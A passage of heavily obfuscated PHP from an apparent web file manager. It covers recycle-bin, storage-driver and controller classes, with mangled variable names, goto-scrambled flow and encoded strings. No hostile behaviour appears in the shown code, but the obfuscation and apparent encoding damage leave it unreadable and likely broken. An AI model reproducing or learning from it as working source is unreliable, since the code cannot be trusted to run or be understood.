$this->fileNameAutoGet($a÷’¶À÷ŒÈ, $ağãç¬ÔÖŸ, $AæšÍÈïÆî, $bĞ†–…µÂ¯); } public function fileNameAutoGet($f„—ñº‚ëõ, $cÜÜÖ×šâ‚, $Bƒã’•Â¤Ñ, $F˜½çù£…§) { $b¡á¨”ğ££ =& $_SERVER[”Ì÷ñ­î¸]; if ($Bƒã’•Â¤Ñ == REPEAT_REPLACE || !$f„—ñº‚ëõ || !in_array_not_case($cÜÜÖ×šâ‚, $f„—ñº‚ëõ) || $F˜½çù£…§ && $Bƒã’•Â¤Ñ != REPEAT_RENAME_FOLDER) { return $cÜÜÖ×šâ‚; } if ($Bƒã’•Â¤Ñ == REPEAT_SKIP) { return !1; } $f‰‚ÙŠÒÆ­ = $b¡á¨”ğ££[91] . get_path_ext($cÜÜÖ×šâ‚); $f‰‚ÙŠÒÆ­ = $f‰‚ÙŠÒÆ­ == $b¡á¨”ğ££[91] || $F˜½çù£…§ ? $b¡á¨”ğ££[33] : $f‰‚ÙŠÒÆ­; for ($DÛùÄêöë = 1; $DÛùÄêöë <= count($f„—ñº‚ëõ) + 1; $DÛùÄêöë++) { $d¶®Š‘µ³å = substr($cÜÜÖ×šâ‚, 0, strlen($cÜÜÖ×šâ‚) - strlen($f‰‚ÙŠÒÆ­)); $DŠÑî‘Ó¿ = $d¶®Š‘µ³å . "\x28{$DÛùÄêöë}\51{$f‰‚ÙŠÒÆ­}"; if (!in_array_not_case($DŠÑî‘Ó¿, $f„—ñº‚ëõ)) { return $DŠÑî‘Ó¿; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\x72\143\x65\137\162\145\143\x79\143\x6c\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\124\151\x6d\145", "\x74\151\x6d\x65", "\x69\156\x73\145\x72\164", "\x66\165\x6e\x63\164\151\157\156")); public function listData($eººÜİ‚ = false) { $A½ê†ÒôÇñ =& $_SERVER[”Ì÷ñ­î¸]; $eººÜİ‚ = $eººÜİ‚ ? $eººÜİ‚ : USER_ID; $FÁ¯²œö©„ = $this->where(array($A½ê†ÒôÇñ[1430] => $eººÜİ‚))->select(); return array_to_keyvalue($FÁ¯²œö©„, $A½ê†ÒôÇñ[33], $A½ê†ÒôÇñ[369]); } public function moveToRecycle($dŸŸù´Ê) { goto BÓÆ½•íé¿; BÓÆ½•íé¿: $bå÷–¬ô‰± =& $_SERVER[”Ì÷ñ­î¸]; $A…Å²À¡†œ = Model($bå÷–¬ô‰±[1117]); $BƒÔ¬î—ÏŠ = $A…Å²À¡†œ->sourceInfo($dŸŸù´Ê); goto AÛ´„¬Ú¼; Cê×¦—“: $this->recycleMove($dŸŸù´Ê, 1); if ($BƒÔ¬î—ÏŠ[$bå÷–¬ô‰±[370]] == $bå÷–¬ô‰±[83]) { $d¾Ú–áè¦Ì = array($bå÷–¬ô‰±[525] => array($bå÷–¬ô‰±[483], $BƒÔ¬î—ÏŠ[$bå÷–¬ô‰±[459]] . $dŸŸù´Ê . $bå÷–¬ô‰±[484])); $A…Å²À¡†œ->where($d¾Ú–áè¦Ì)->setField($bå÷–¬ô‰±[397], 1); } goto a÷˜À‚ùË™; AÛ´„¬Ú¼: if (!$BƒÔ¬î—ÏŠ || $BƒÔ¬î—ÏŠ[$bå÷–¬ô‰±[397]] == $bå÷–¬ô‰±[83]) { return; } $d•Ç…œéÕ­ = array($bå÷–¬ô‰±[383] => $dŸŸù´Ê, $bå÷–¬ô‰±[1430] => USER_ID, $bå÷–¬ô‰±[521] => $BƒÔ¬î—ÏŠ[$bå÷–¬ô‰±[371]], $bå÷–¬ô‰±[522] => $BƒÔ¬î—ÏŠ[$bå÷–¬ô‰±[456]], $bå÷–¬ô‰±[525] => $BƒÔ¬î—ÏŠ[$bå÷–¬ô‰±[459]]); $this->add($d•Ç…œéÕ­); goto Cê×¦—“; a÷˜À‚ùË™: } public function clear() { $this->remove(!1); } public function remove($cÃñµ·› = false) { goto fëŒ„×ˆ; FÖÑÔ¦İà‰: foreach ($E¦ÍÊ¦Óğˆ as $BĞäßó†ªØ) { $eø­ßùÎà×->targetSpaceUpdate($BĞäßó†ªØ[$cöê¤Á±‘¦[371]], $BĞäßó†ªØ[$cöê¤Á±‘¦[456]]); } goto bÔ²òµ·œÂ; däÓÎ‰òÍƒ: $cÃñµ·› = $cÃñµ·› === !1 ? !1 : $cÃñµ·›; $E¦ÍÊ¦Óğˆ = array(); foreach ($E†ğÂßøöÓ as $AÅ÷‚ë²è) { if ($cÃñµ·› != !1 && !in_array($AÅ÷‚ë²è, $cÃñµ·›)) { continue; } $eø­ßùÎà×->remove($AÅ÷‚ë²è, !1); $aøËÁÑàêò = $this->where(array($cöê¤Á±‘¦[369] => $AÅ÷‚ë²è))->find(); $Eàç½ĞÁ¡‹ = $aøËÁÑàêò[$cöê¤Á±‘¦[371]] . $cöê¤Á±‘¦[70] . $aøËÁÑàêò[$cöê¤Á±‘¦[456]]; $E¦ÍÊ¦Óğˆ[$Eàç½ĞÁ¡‹] = array($cöê¤Á±‘¦[521] => $aøËÁÑàêò[$cöê¤Á±‘¦[371]], $cöê¤Á±‘¦[456] => $aøËÁÑàêò[$cöê¤Á±‘¦[456]]); $this->where(array($cöê¤Á±‘¦[369] => $AÅ÷‚ë²è))->delete(); } goto FÖÑÔ¦İà‰; fëŒ„×ˆ: $cöê¤Á±‘¦ =& $_SERVER[”Ì÷ñ­î¸]; $eø­ßùÎà× = Model($cöê¤Á±‘¦[1117]); $E†ğÂßøöÓ = $this->listData(); goto däÓÎ‰òÍƒ; bÔ²òµ·œÂ: } public function restore($cÙ›À³Ü = false) { goto AËÔïËØ¦©; D¨´ğ¼ÆÉĞ: $cÙ›À³Ü = $cÙ›À³Ü == !1 ? !1 : $cÙ›À³Ü; if (!$bô‰Á—ˆ›ã) { return !0; } $Aù—£¤Æ³¼ = array(); goto b½óÜ–æ¸; b½óÜ–æ¸: foreach ($bô‰Á—ˆ›ã as $Aèö‰º¨İÑ) { goto d°•º¸»‘¢; d°•º¸»‘¢: if ($cÙ›À³Ü != !1 && !in_array($Aèö‰º¨İÑ, $cÙ›À³Ü)) { continue; } $bİ‘íßÆ¢ˆ = $Eä¨Ü³íùÇ->sourceInfo($Aèö‰º¨İÑ); $d›ùÁİğ‡ = $Eä¨Ü³íùÇ->sourceInfo($bİ‘íßÆ¢ˆ[$AÎ¿‡øÄ”ë[461]]); goto B‚Œ…¹†£‹; B¬ò±ºË¾¤: if ($bİ‘íßÆ¢ˆ[$AÎ¿‡øÄ”ë[370]] == $AÎ¿‡øÄ”ë[83]) { $A½ÌÒ§†Ú³ = array($AÎ¿‡øÄ”ë[525] => array($AÎ¿‡øÄ”ë[483], $bİ‘íßÆ¢ˆ[$AÎ¿‡øÄ”ë[459]] . $Aèö‰º¨İÑ . $AÎ¿‡øÄ”ë[484])); $Eä¨Ü³íùÇ->where($A½ÌÒ§†Ú³)->setField($AÎ¿‡øÄ”ë[397], 0); $this->restoreFolderChildren($Aèö‰º¨İÑ, $bô‰Á—ˆ›ã); } $this->where(array($AÎ¿‡øÄ”ë[369] => $Aèö‰º¨İÑ))->delete(); $Eä¨Ü³íùÇ->folderSizeReset($bİ‘íßÆ¢ˆ[$AÎ¿‡øÄ”ë[461]]); goto Aš„àÈÓÇ“; B‚Œ…¹†£‹: if ($d›ùÁİğ‡[$AÎ¿‡øÄ”ë[397]] == $AÎ¿‡øÄ”ë[83]) { continue; } $Eä¨Ü³íùÇ->lockMoveStart($Aèö‰º¨İÑ); $this->recycleMove($Aèö‰º¨İÑ, 0); goto B¬ò±ºË¾¤; Aš„àÈÓÇ“: $Aù—£¤Æ³¼[] = $bİ‘íßÆ¢ˆ[$AÎ¿‡øÄ”ë[461]]; if ($bİ‘íßÆ¢ˆ[$AÎ¿‡øÄ”ë[370]] == $AÎ¿‡øÄ”ë[83]) { $Aù—£¤Æ³¼[] = $Aèö‰º¨İÑ; } $Eä¨Ü³íùÇ->lockMoveEnd($Aèö‰º¨İÑ); goto Cª­Üàóİó; Cª­Üàóİó: } $Eä¨Ü³íùÇ->updateModifyTime($Aù—£¤Æ³¼); goto AœÄœ“­ê±; AËÔïËØ¦©: $AÎ¿‡øÄ”ë =& $_SERVER[”Ì÷ñ­î¸]; $Eä¨Ü³íùÇ = Model($AÎ¿‡øÄ”ë[1117]); $bô‰Á—ˆ›ã = $this->listData(); goto D¨´ğ¼ÆÉĞ; AœÄœ“­ê±: } private function restoreFolderChildren($f—œã¦ô—Â, $aÑñŒ¤±Ÿ) { goto C¦Ì…é; B¿Ğ¸ŒÑ—‰: foreach ($aÑñŒ¤±Ÿ as $DÜ¦ƒï†) { if ($DÜ¦ƒï† == $f—œã¦ô—Â) { continue; } if (!$CÑÁ¤Àë„‘->isParentOf($f—œã¦ô—Â, $DÜ¦ƒï†)) { continue; } $B”ÃŒØ•¾ = $CÑÁ¤Àë„‘->sourceInfo($DÜ¦ƒï†); if ($B”ÃŒØ•¾[$DÈŒÓˆÕ½[370]] == $DÈŒÓˆÕ½[83]) { $Dë•Ôòª©†[] = array($DÈŒÓˆÕ½[525] => array($DÈŒÓˆÕ½[483], $B”ÃŒØ•¾[$DÈŒÓˆÕ½[459]] . $DÜ¦ƒï† . $DÈŒÓˆÕ½[484])); } else { $Dë•Ôòª©†[$DÈŒÓˆÕ½[369]][1][] = $DÜ¦ƒï†; } } if (!$Dë•Ôòª©†[$DÈŒÓˆÕ½[369]][1]) { unset($Dë•Ôòª©†[$DÈŒÓˆÕ½[369]]); } if (!$Dë•Ôòª©†) { return; } goto EêõÙò×³â; C¦Ì…é: $DÈŒÓˆÕ½ =& $_SERVER[”Ì÷ñ­î¸]; $CÑÁ¤Àë„‘ = Model($DÈŒÓˆÕ½[1117]); $Dë•Ôòª©† = array($DÈŒÓˆÕ½[369] => array($DÈŒÓˆÕ½[7], array())); goto B¿Ğ¸ŒÑ—‰; EêõÙò×³â: $Dë•Ôòª©†[$DÈŒÓˆÕ½[369]][1] = array_unique($Dë•Ôòª©†[$DÈŒÓˆÕ½[369]][1]); $Dë•Ôòª©†[$DÈŒÓˆÕ½[916]] = $DÈŒÓˆÕ½[2186]; $CÑÁ¤Àë„‘->where($Dë•Ôòª©†)->setField($DÈŒÓˆÕ½[397], 1); goto dÛó¤Òø‰; dÛó¤Òø‰: } private function recycleMove($d®ÎÅÅ§ñ„, $D·ŸÆå†³É = 1) { $DÈ¸îÌªœÜ =& $_SERVER[”Ì÷ñ­î¸]; $E¶ÂÓªá¨É = Model($DÈ¸îÌªœÜ[1117]); $Cï´ˆ˜‚÷å = Model($DÈ¸îÌªœÜ[2364]); $fá×ç÷¬‘“ = array($DÈ¸îÌªœÜ[369] => $d®ÎÅÅ§ñ„); if ($D·ŸÆå†³É) { $E¶ÂÓªá¨É->where($fá×ç÷¬‘“)->setField($DÈ¸îÌªœÜ[397], 1); $Cï´ˆ˜‚÷å->eventRecycle($d®ÎÅÅ§ñ„, $DÈ¸îÌªœÜ[2365]); } else { $dÄ”‡†­ = $E¶ÂÓªá¨É->where($fá×ç÷¬‘“)->find(); $e¬°‡Üô = $dÄ”‡†­[$DÈ¸îÌªœÜ[370]] == $DÈ¸îÌªœÜ[83]; $f„²º«‹ùŒ = $E¶ÂÓªá¨É->fileNameAuto($dÄ”‡†­[$DÈ¸îÌªœÜ[461]], $dÄ”‡†­[$DÈ¸îÌªœÜ[28]], REPEAT_RENAME_FOLDER, $e¬°‡Üô); if ($f„²º«‹ùŒ != $dÄ”‡†­[$DÈ¸îÌªœÜ[28]]) { $E¶ÂÓªá¨É->rename($d®ÎÅÅ§ñ„, $f„²º«‹ùŒ); } $E¶ÂÓªá¨É->where($fá×ç÷¬‘“)->setField($DÈ¸îÌªœÜ[397], 0); $Cï´ˆ˜‚÷å->eventRecycle($d®ÎÅÅ§ñ„, $DÈ¸îÌªœÜ[2366]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\x73\x74\x6f\162\x61\x67\145\114\151\163\164"; public $field = array("\156\141\155\145", "\163\x69\172\145\x4d\x61\x78", "\x73\x79\163\164\x65\x6d", "\x64\x65\146\x61\165\154\164", "\x64\x72\151\x76\x65\x72", "\143\x6f\x6e\x66\151\x67"); public function listData($e©¨Ï¿ïƒ¶ = false, $EÎİ°¶™§‡ = "\155\x6f\x64\151\x66\171\124\x69\155\145", $D¬§çÍ“Æ• = false) { goto AÜ¢ÍÔïª; fËó»ÌªÒÚ: return $Aá—’İø¸; goto Bİ¼‡˜³‚ô; F´»Ç¢ß‹“: foreach ($Aá—’İø¸ as $A’ƒŒçÛ»˜ => $E¹®¸Ú¾½Ó) { unset($Aá—’İø¸[$A’ƒŒçÛ»˜][$bÒ¢Ä«ŸèĞ[6]]); $Aá—’İø¸[$A’ƒŒçÛ»˜][$bÒ¢Ä«ŸèĞ[2092]] = 0; } $bí˜ìåŠëç = array_to_keyvalue($Aá—’İø¸, $bÒ¢Ä«ŸèĞ[33], $bÒ¢Ä«ŸèĞ[367]); $this->_listAppendSize($Aá—’İø¸, $bí˜ìåŠëç); goto fËó»ÌªÒÚ; AÜ¢ÍÔïª: $bÒ¢Ä«ŸèĞ =& $_SERVER[”Ì÷ñ­î¸]; $Aá—’İø¸ = parent::listData($e©¨Ï¿ïƒ¶, $EÎİ°¶™§‡, $D¬§çÍ“Æ•); if ($e©¨Ï¿ïƒ¶) { return $Aá—’İø¸; } goto F´»Ç¢ß‹“; Bİ¼‡˜³‚ô: } public function _listAppendSize(&$b’¿ø¸ø, $F×‚„İĞ•¤) { $cß·´İÇ =& $_SERVER[”Ì÷ñ­î¸]; if (!$F×‚„İĞ•¤) { return; } $cŒ–‡‹Ø “ = $cß·´İÇ[2367] . implode($cß·´İÇ[47], $F×‚„İĞ•¤) . $cß·´İÇ[2368]; $bë¢×±ŸÇ = Model($cß·´İÇ[720])->query($cŒ–‡‹Ø “); $bë¢×±ŸÇ = array_to_keyvalue($bë¢×±ŸÇ, $cß·´İÇ[367], $cß·´İÇ[77]); foreach ($b’¿ø¸ø as $d¯£İˆ‰’  => $AŒÀÒÄ´ğ–) { $b’¿ø¸ø[$d¯£İˆ‰’ ][$cß·´İÇ[2092]] = isset($bë¢×±ŸÇ[$AŒÀÒÄ´ğ–[$cß·´İÇ[367]]]) ? $bë¢×±ŸÇ[$AŒÀÒÄ´ğ–[$cß·´İÇ[367]]] : 0; } } public function getConfig($A’ˆ¹ÑŸÙ¡) { $eÏ‚õ‚ÖŒĞ = parent::listData($A’ˆ¹ÑŸÙ¡); return json_decode($eÏ‚õ‚ÖŒĞ[$_SERVER[”Ì÷ñ­î¸][6]], !0); } public function update($fÖ²Ò««¤±, $eòùÊùéÃø) { goto A¸´Şíœ‚; cÍó•‡®: $A²Œ‘†«‘í = parent::update($fÖ²Ò««¤±, $eòùÊùéÃø); if ($A²Œ‘†«‘í && $eòùÊùéÃø[$FÔ‡Ù‹ŒŞ[34]]) { foreach ($f½Ç÷Á‹‡ as $B¶ ê´…) { if ($B¶ ê´…[$FÔ‡Ù‹ŒŞ[34]] && $B¶ ê´…[$FÔ‡Ù‹ŒŞ[367]] != $fÖ²Ò««¤±) { parent::update($B¶ ê´…[$FÔ‡Ù‹ŒŞ[367]], array($FÔ‡Ù‹ŒŞ[34] => 0)); } } } return $A²Œ‘†«‘í; goto f¥°…ô¬¡; A¸´Şíœ‚: $FÔ‡Ù‹ŒŞ =& $_SERVER[”Ì÷ñ­î¸]; $F½áâ”äØ = $eòùÊùéÃø[$FÔ‡Ù‹ŒŞ[28]]; $f½Ç÷Á‹‡ = array_to_keyvalue(parent::listData(), $FÔ‡Ù‹ŒŞ[28]); goto f¥ŠÅƒÂ; f¥ŠÅƒÂ: if (isset($f½Ç÷Á‹‡[$F½áâ”äØ]) && $f½Ç÷Á‹‡[$F½áâ”äØ][$FÔ‡Ù‹ŒŞ[367]] != $fÖ²Ò««¤±) { return !1; } if (isset($eòùÊùéÃø[$FÔ‡Ù‹ŒŞ[2369]]) && $eòùÊùéÃø[$FÔ‡Ù‹ŒŞ[2369]] == $FÔ‡Ù‹ŒŞ[83]) { $this->checkConfig($eòùÊùéÃø); } unset($eòùÊùéÃø[$FÔ‡Ù‹ŒŞ[2369]]); goto cÍó•‡®; f¥°…ô¬¡: } public function add($f‹«®Ë—šÊ) { goto AÉŞ„Û¶ÄØ; cÂÆÑö—£·: $this->checkConfig($f‹«®Ë—šÊ); $C‹Â¬‡êò› = parent::insert($f‹«®Ë—šÊ); if ($C‹Â¬‡êò› && $f‹«®Ë—šÊ[$E„ŒªÊÄãÅ[34]]) { foreach ($a¿³±•¬¹¶ as $a‡¼”²â¤‡) { if ($a‡¼”²â¤‡[$E„ŒªÊÄãÅ[34]]) { parent::update($a‡¼”²â¤‡[$E„ŒªÊÄãÅ[367]], array($E„ŒªÊÄãÅ[34] => 0)); } } } goto dŸ´Ş×Ü‰Õ; dŸ´Ş×Ü‰Õ: return $C‹Â¬‡êò›; goto B“ä‚è„; AÉŞ„Û¶ÄØ: $E„ŒªÊÄãÅ =& $_SERVER[”Ì÷ñ­î¸]; $a¿³±•¬¹¶ = array_to_keyvalue(parent::listData(), $E„ŒªÊÄãÅ[28]); if (isset($a¿³±•¬¹¶[$f‹«®Ë—šÊ[$E„ŒªÊÄãÅ[28]]])) { return !1; } goto cÂÆÑö—£·; B“ä‚è„: } public function checkConfig(&$DÔêØ£šÍ) { goto B´†‚ İ”Ã; aàÎ˜¼Î’: $EÌœ‡’š¥› = $c›Â¦ÑİòŒ[71] . $AÆ–”–é”‚; $a…ÍĞœŸ™É = new $EÌœ‡’š¥›($E‚ùÊ©ƒ±); if (in_array($döù¶ƒß¯, $a…ÍĞœŸ™É->objectDriver)) { if (!$a…ÍĞœŸ™É->isBucketCors() && !$a…ÍĞœŸ™É->setBucketCors()) { $AƒˆáÂ§® = LNG($c›Â¦ÑİòŒ[2370]); $AƒˆáÂ§® .= $c›Â¦ÑİòŒ[2371] . LNG($c›Â¦ÑİòŒ[2372]); show_json($AƒˆáÂ§®, !1); } } goto A“Ã”Õ–í”; A“Ã”Õ–í”: $bÏÃÁ›¡œ = $a…ÍĞœŸ™É->getPath($C’º¦ŞÉ¦± . $c›Â¦ÑİòŒ[1988]); if (!$a…ÍĞœŸ™É->mkfile($bÏÃÁ›¡œ)) { show_json(LNG($c›Â¦ÑİòŒ[2370]), !1); } $E‚ùÊ©ƒ±[$c›Â¦ÑİòŒ[1024]] = $C’º¦ŞÉ¦±; goto CŠø†å“ôÛ; CŠø†å“ôÛ: $DÔêØ£šÍ[$c›Â¦ÑİòŒ[6]] = json_encode($E‚ùÊ©ƒ±); $DÔêØ£šÍ[$c›Â¦ÑİòŒ[90]] = $AÆ–”–é”‚; return !0; goto dªŞ¾ôÔïç; bÉ§¿¾¢ãß: foreach ($E‚ùÊ©ƒ± as $EÒá²Ö„«Ú => $B¤ëàœš³˜) { $E‚ùÊ©ƒ±[$EÒá²Ö„«Ú] = trim($B¤ëàœš³˜); } $C’º¦ŞÉ¦± = rtrim($E‚ùÊ©ƒ±[$c›Â¦ÑİòŒ[1024]], $c›Â¦ÑİòŒ[8]) . $c›Â¦ÑİòŒ[8]; $AÆ–”–é”‚ = $this->driverType($döù¶ƒß¯); goto aàÎ˜¼Î’; B´†‚ İ”Ã: $c›Â¦ÑİòŒ =& $_SERVER[”Ì÷ñ­î¸]; $döù¶ƒß¯ = strtolower($DÔêØ£šÍ[$c›Â¦ÑİòŒ[90]]); $E‚ùÊ©ƒ± = json_decode($DÔêØ£šÍ[$c›Â¦ÑİòŒ[6]], !0); goto bÉ§¿¾¢ãß; dªŞ¾ôÔïç: } private function driverType($dòğ‚…‰ˆŠ) { $Bš±õ”Æ©Œ =& $_SERVER[”Ì÷ñ­î¸]; $cİÅ˜ƒ°Ò¾ = array($Bš±õ”Æ©Œ[102] => $Bš±õ”Æ©Œ[2373], $Bš±õ”Æ©Œ[58] => $Bš±õ”Æ©Œ[2374], $Bš±õ”Æ©Œ[64] => $Bš±õ”Æ©Œ[2375]); if (isset($cİÅ˜ƒ°Ò¾[$dòğ‚…‰ˆŠ])) { return $cİÅ˜ƒ°Ò¾[$dòğ‚…‰ˆŠ]; } return strtoupper($dòğ‚…‰ˆŠ); } public function driverListSystem() { $CÛ±‡ù ¬œ =& $_SERVER[”Ì÷ñ­î¸]; $EÃ©Â ìŒõ = parent::listData(); $c¼×ƒ–¤Å© = array(); foreach ($EÃ©Â ìŒõ as $c‰¥ù¼Îâ…) { unset($c‰¥ù¼Îâ…[$CÛ±‡ù ¬œ[187]], $c‰¥ù¼Îâ…[$CÛ±‡ù ¬œ[107]]); $c‰¥ù¼Îâ…[$CÛ±‡ù ¬œ[6]] = json_decode($c‰¥ù¼Îâ…[$CÛ±‡ù ¬œ[6]], !0); $c¼×ƒ–¤Å©[] = $c‰¥ù¼Îâ…; } return $c¼×ƒ–¤Å©; } public function defaultDriver() { $CÌ‘Ô¦œ§ =& $_SERVER[”Ì÷ñ­î¸]; $b‰ò±ä‘ï‘ = parent::listData(); $eåˆªˆ˜“° = array_filter_by_field($b‰ò±ä‘ï‘, $CÌ‘Ô¦œ§[34], 1); $eåˆªˆ˜“° = $eåˆªˆ˜“°[0]; if ($eåˆªˆ˜“°) { $eåˆªˆ˜“°[$CÌ‘Ô¦œ§[6]] = json_decode($eåˆªˆ˜“°[$CÌ‘Ô¦œ§[6]], !0); } return $eåˆªˆ˜“°; } public function driverInfo($cè°ìŠ òÇ) { $bØÃ›ëÚ„ƒ =& $_SERVER[”Ì÷ñ­î¸]; $CÈ¡£šâà = array_to_keyvalue(parent::listData(), $bØÃ›ëÚ„ƒ[367]); if (!isset($CÈ¡£šâà[$cè°ìŠ òÇ])) { return !1; } $dëèÒµïùÎ = $CÈ¡£šâà[$cè°ìŠ òÇ]; $dëèÒµïùÎ[$bØÃ›ëÚ„ƒ[6]] = json_decode($dëèÒµïùÎ[$bØÃ›ëÚ„ƒ[6]], !0); return $dëèÒµïùÎ; } public function remove($f·ñµóãÊ›) { $this->removeShareItems($f·ñµóãÊ›); return parent::remove($f·ñµóãÊ›); } public function removeWithFile($e“Ö‡Ì•Æø) { goto AÏ…„ÔÜÄ; AÏ…„ÔÜÄ: $D™¢’¦±ÚÀ =& $_SERVER[”Ì÷ñ­î¸]; $föÎ¬è»‘ = array($D™¢’¦±ÚÀ[745] => $e“Ö‡Ì•Æø); $Cçó³ŸÂ¸í = Model($D™¢’¦±ÚÀ[422])->where($föÎ¬è»‘)->count(); goto dÓ²—÷Ü­Ù; AÈÍª‚Œß×: if (!$d×İÀ´­ÅÑ) { $bÊÊº”¾Ş£->stop($A×ºÜŞù¼É); return !1; } $bÊÊº”¾Ş£->end(); $this->remove($e“Ö‡Ì•Æø); goto bë­áèîŠõ; dÓ²—÷Ü­Ù: $cà‰ïà– = Model($D™¢’¦±ÚÀ[422])->where($föÎ¬è»‘)->sum($D™¢’¦±ÚÀ[77]); $A×ºÜŞù¼É = $D™¢’¦±ÚÀ[2376] . $e“Ö‡Ì•Æø; $bÊÊº”¾Ş£ = new TaskFileTransfer($A×ºÜŞù¼É, $D™¢’¦±ÚÀ[2377], $Cçó³ŸÂ¸í, LNG($D™¢’¦±ÚÀ[2378]) . "\x28{$e“Ö‡Ì•Æø}\x29"); goto dãè¤‘©­Ç; AÍä‚‘Ç¹: $e®¸‘º—‹Ğ = "\x7b\151\x6f\x3a{$bŒÄ”˜’Í}\175\x2f"; $d×İÀ´­ÅÑ = !0; $Dò”Š­ª¼ñ = array(); goto Eê±ãê¿©£; dãè¤‘©­Ç: $bÊÊº”¾Ş£->task[$D™¢’¦±ÚÀ[699]] = (double) $cà‰ïà–; $eØ®ñë¬†Ã = KodIO::defaultDriver(); $bŒÄ”˜’Í = $eØ®ñë¬†Ã[$D™¢’¦±ÚÀ[367]]; goto AÍä‚‘Ç¹; Eê±ãê¿©£: $CêáÛåÔ = Model($D™¢’¦±ÚÀ[167])->where($föÎ¬è»‘)->field($D™¢’¦±ÚÀ[2379])->select(); foreach ($CêáÛåÔ as $Fó´¤¾«áÛ) { goto DÍÌ ÄÒó°; BãŸÂ„»: $CÉğÛÙ§Ö = array($D™¢’¦±ÚÀ[745] => $bŒÄ”˜’Í, $D™¢’¦±ÚÀ[75] => $b÷Ø„ÉÆóŠ); Model($D™¢’¦±ÚÀ[167])->where($föÎ¬è»‘)->save($CÉğÛÙ§Ö); goto D§¾‹ë÷Æç; f÷„ÉôÃÁ: if (IO::exist($b÷Ø„ÉÆóŠ)) { $bÊÊº”¾Ş£->updateFileEnd($Fó´¤¾«áÛ[$D™¢’¦±ÚÀ[28]], $Fó´¤¾«áÛ[$D™¢’¦±ÚÀ[77]]); continue; } if (!IO::move($E° µŒÇ«, get_path_father($b÷Ø„ÉÆóŠ))) { $d×İÀ´­ÅÑ = !1; break; } $föÎ¬è»‘ = array($D™¢’¦±ÚÀ[419] => $Fó´¤¾«áÛ[$D™¢’¦±ÚÀ[419]]); goto BãŸÂ„»; DÍÌ ÄÒó°: $E° µŒÇ« = $Fó´¤¾«áÛ[$D™¢’¦±ÚÀ[75]]; $b÷Ø„ÉÆóŠ = $e®¸‘º—‹Ğ . str_replace("\x7b\151\157\72{$e“Ö‡Ì•Æø}\175\57", $D™¢’¦±ÚÀ[33], $E° µŒÇ«); if (!IO::exist($E° µŒÇ«)) { $Dò”Š­ª¼ñ[] = $Fó´¤¾«áÛ[$D™¢’¦±ÚÀ[419]]; $bÊÊº”¾Ş£->updateFileEnd($Fó´¤¾«áÛ[$D™¢’¦±ÚÀ[28]], $Fó´¤¾«áÛ[$D™¢’¦±ÚÀ[77]]); continue; } goto f÷„ÉôÃÁ; D§¾‹ë÷Æç: } $this->removeByFileID($Dò”Š­ª¼ñ); goto AÈÍª‚Œß×; bë­áèîŠõ: } public function progress($DĞ¢¦‹¶Åç) { return Task::get($_SERVER[”Ì÷ñ­î¸][2376] . $DĞ¢¦‹¶Åç); } private function removeByFileID($CÂ·á¥œÔç = array()) { goto Fâ«§ ‰†; Fâ«§ ‰†: $aâåæÜ• =& $_SERVER[”Ì÷ñ­î¸]; if (empty($CÂ·á¥œÔç)) { return; } $C‚ë†´—È° = array($aâåæÜ•[419] => array($aâåæÜ•[7], $CÂ·á¥œÔç)); goto b“‘¡ÉäºÊ; b“‘¡ÉäºÊ: $B¸ì‘°ÓøÌ = Model($aâåæÜ•[1117])->where($C‚ë†´—È°)->field($aâåæÜ•[369])->select(); if (!$B¸ì‘°ÓøÌ) { return; } $B¸ì‘°ÓøÌ = array_to_keyvalue($B¸ì‘°ÓøÌ, $aâåæÜ•[33], $aâåæÜ•[369]); goto Aµ­óòÏì·; Aµ­óòÏì·: foreach ($B¸ì‘°ÓøÌ as $dø¸ö×é¦) { Model($aâåæÜ•[382])->removeNow($dø¸ö×é¦, !1); } goto A¦ä·…’îÙ; A¦ä·…’îÙ: } private function removeShareItems($C¤ù—†»ß³) { goto aŞéÇÒ¡Ãì; Eøºí‹ëäš: $BÊ˜œ«‚İ = Model($Cœ‡ÙŠ…§æ[2083])->where($c·’îì©‘Ñ)->field($Cœ‡ÙŠ…§æ[441])->select(); if (empty($BÊ˜œ«‚İ)) { return; } $b‡­µ‘©“ = array_to_keyvalue($BÊ˜œ«‚İ, $Cœ‡ÙŠ…§æ[33], $Cœ‡ÙŠ…§æ[441]); goto aÄ³ÜÔ³¢; aŞéÇÒ¡Ãì: $Cœ‡ÙŠ…§æ =& $_SERVER[”Ì÷ñ­î¸]; $D¼ß·‹ˆ‡  = "\173\151\x6f\72{$C¤ù—†»ß³}\175\57"; $c·’îì©‘Ñ = array($Cœ‡ÙŠ…§æ[369] => 0, $Cœ‡ÙŠ…§æ[1018] => array($Cœ‡ÙŠ…§æ[753], "{$D¼ß·‹ˆ‡ }\45")); goto Eøºí‹ëäš; aÄ³ÜÔ³¢: Model($Cœ‡ÙŠ…§æ[536])->remove($b‡­µ‘©“); goto c‘©¾…À¡í; c‘©¾…À¡í: } } goto dòË ¾¸¤; C¤‘Ë»½’‘: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto AÅ¬¨ì’‡µ; Dİ©ğ†°Ù: $this->in =& $in; $this->values[$dÁÊÚƒëî[6]] =& $config; $this->values[$dÁÊÚƒëî[7]] =& $in; goto bÒÎÄ¦š‹ç; bÒÎÄ¦š‹ç: $this->tpl = TEMPLATE . MOD . $dÁÊÚƒëî[8]; $this->_classObjectID = mt_rand(0, 10000); goto B¤àØ“‹ËÉ; AÅ¬¨ì’‡µ: $dÁÊÚƒëî =& $_SERVER[”Ì÷ñ­î¸]; global $in, $config; $this->config =& $config; goto Dİ©ğ†°Ù; B¤àØ“‹ËÉ: } public function loadClass($bîìŠ¶¿É°) { if (1 === func_num_args()) { $this->{$bîìŠ¶¿É°} = new $bîìŠ¶¿É°(); } else { $FìÚÍ•’„é = new ReflectionClass($bîìŠ¶¿É°); $e¯Ò‘Œ­­­ = func_get_args(); array_shift($e¯Ò‘Œ­­­); $this->{$bîìŠ¶¿É°} = $FìÚÍ•’„é->newInstanceArgs($e¯Ò‘Œ­­­); } return $this->{$bîìŠ¶¿É°}; } protected function assign($FÃŸ£åˆÌµ, $C«í°Áİîã) { $this->values[$FÃŸ£åˆÌµ] = $C«í°Áİîã; } protected function display($b½Ä©²Îäõ) { ob_end_clean(); extract($this->values); require $this->tpl . $b½Ä©²Îäõ; } } class DbSqliteBase extends Db { public function __construct($A¡èÉî—íé = '') { $c¨„áöÄ½½ =& $_SERVER[”Ì÷ñ­î¸]; if 